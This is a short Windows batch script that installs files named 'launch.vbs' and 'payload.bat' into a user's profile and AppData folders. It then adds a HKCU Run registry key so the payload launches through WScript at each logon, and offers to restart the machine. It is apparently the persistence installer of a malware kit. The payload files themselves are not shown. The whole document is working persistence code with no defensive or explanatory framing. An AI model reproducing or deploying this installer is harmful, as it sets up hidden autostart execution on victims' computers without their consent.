@echo off
copy "payload\launch.vbs" "C:\Users\%username%" >nul
if exist "C:\Users\%username%\launch.vbs" (echo [92msuccessfuly moved launch.vbs[0m) else (echo [31mfailed to move launch.vbs[0m)
copy "payload\payload.bat"  "C:\users\%username%\AppData" >nul
if exist "C:\users\%username%\AppData\payload.bat" (echo [92msuccessfuly moved payload.bat[0m) else (echo [31mfailed to move payload.bat[0m)
REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /t REG_SZ /d "WScript C:\users\%username%\launch.vbs"
echo [92msuccessfuly modified HKCU registry[0m
echo would you like to restart for the changes to take effect?
choice 
if %errorlevel% equ 1 shutdown /g
exit
